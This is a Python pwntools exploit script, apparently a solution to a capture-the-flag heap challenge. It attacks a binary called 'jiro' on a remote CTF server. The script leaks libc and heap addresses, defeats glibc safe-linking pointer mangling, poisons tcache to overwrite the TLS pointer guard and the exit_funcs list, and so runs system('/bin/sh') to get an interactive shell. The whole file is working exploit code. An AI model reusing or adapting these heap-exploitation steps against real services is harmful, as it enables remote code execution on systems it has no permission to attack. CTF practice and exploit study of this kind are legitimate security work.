# AUTHOR: @nepaletka

from pwn import *
from time import sleep
context.binary = binary = ELF("./app/jiro", checksec=False)
context.log_level = "debug"
context.terminal = ['gnome-terminal', '-e']
libc = ELF('./app/libc.so.6', checksec=False)

# p = process()
p = remote("ctfd.cybpaws.su", 11777)

def debug(p):
    pid = util.proc.pidof(p)[0]
    print(pid)
    util.proc.wait_for_debugger(pid)

def mangle(heap_addr, val):
    return (heap_addr >> 12) ^ val

def demangle(val, is_heap_base=False):
    if not is_heap_base:
        mask = 0xfff << 52
        while mask:
            v = val & mask
            val ^= (v >> 12)
            mask >>= 12
        return val
    return val << 12


def hire(name, role=1):
    p.sendlineafter(b'>> ', b'1')
    p.sendlineafter(b'Employee name: ', name)
    p.sendlineafter(b'>> ', str(role).encode())
    p.recvline()
    p.recvline()
    p.recvline()
    return p.recvline()[4:-1]

def edit_employee(emp_id, new_name, role=1):
    p.sendlineafter(b'>> ', b'2')
    p.sendlineafter(b'Enter employee id: ', f'{emp_id:s}'.encode())
    p.sendlineafter(b'Employee name: ', new_name)
    p.sendlineafter(b'>> ', str(role).encode())

def fire(emp_id):
    p.sendlineafter(b'>> ', b'3')
    p.sendlineafter(b'Empoyee ID: ', f'{emp_id:s}'.encode())

def add_task(emp_id, name, reward):
    p.sendlineafter(b'>> ', b'4')
    p.sendlineafter(b'Empoyee ID: ', f'{emp_id:s}'.encode())
    p.sendlineafter(b'Task reward: ', str(reward).encode())
    p.sendlineafter(b'Task name: ', name)
    p.recvuntil(b"Task ID: ")
    return p.recvline().strip().decode()

def close_task(task_id="1"):
    p.sendlineafter(b'>> ', b'5')
    p.sendlineafter(b'Enter task id: ', f'{task_id:s}'.encode())

def show_employee(emp_id, debug=0):
    if debug == 1:
        gdb.attach(p, gdbscript='''
        b *show_employee_card+53        
        c
        bins
        ''')
        sleep(1)
    p.sendlineafter(b'>> ', b'6')
    p.sendlineafter(b'Enter employee id: ', f'{emp_id:s}'.encode())

def show_task(task_id):
    p.sendlineafter(b'>> ', b'7')
    p.sendlineafter(b'Enter task id: ', str(task_id).encode())

# --------------- EXPLOIT STARTS HERE ---------------

leak = lambda : u64(p.recvline()[:-1].ljust(8,b"\x00"))

#Step 1 Leak libc
usorted = hire(b"A" * 0x500).decode()
hire(b"A" * 0x10).decode()
add_task(usorted, b"hui", 100001)
close_task()

show_employee(usorted)
p.recvuntil(b"Name: ")
libc.address = leak() - 1944352

hire(b"A" * 0x500).decode()
hire(b"A" * 0x500).decode()


#Step 2 Overwrite tls mangle 
a = hire(b"B" * 0x10).decode()
b = hire(b"B" * 0x40).decode()

add_task(a, b"hui", 100001)
fire(b)
close_task()

show_employee(a)
p.recvuntil(b"Name: ")

heap = demangle(leak())
edit_employee(a, p64(mangle(heap,libc.address  - 10384)))

hire(b"B" * 0x40).decode()
hire(b"B" * 0x40).decode()

xor = hire(p64(0) + p64(0)).decode()


#Step 3 Overwrite exit_funcs
a = hire(b"B" * 0x10).decode()
b = hire(b"B" * 0x50).decode()

add_task(a, b"hui", 100001)

fire(b)
close_task()

show_employee(a)
p.recvuntil(b"Name: ")

heap = demangle(leak())
edit_employee(a, p64(mangle(heap,libc.address + 1949632 - 0x30)))

hire(b"B" * 0x50).decode()
hire(b"B" * 0x50).decode()

exitat = hire(b"q" * 0x10).decode()

emp_ids = []
for i in range(7):
    emp_id = hire(b"A" * 0x50).decode()
    emp_ids.append(emp_id)
fast = hire(b"A" * 0x50).decode()
for i in emp_ids:
    fire(i)

add_task(fast, b"hui", 100001)
close_task()

another_heap = heap + 0x1000
print(hex(another_heap))
print(hex(libc.address + 1949632))
print(hex(libc.address))

edit_employee(exitat, p64(0x61) + p64(0x61))

edit_employee(fast, p64(mangle(another_heap,libc.address + 1949632 - 0x28 - 0x8)))

hire(b"A" * 0x50).decode()

payload = flat([
    libc.sym.system << 17,
    next(libc.search(b'/bin/sh\x00')),
])

hire(p64(0) + p64(0) + p64(1) + p64(0) * 2 + p64(1) + p64(4) + payload +p64(0)).decode()

sleep(3)
p.sendline(b'8')

p.interactive()
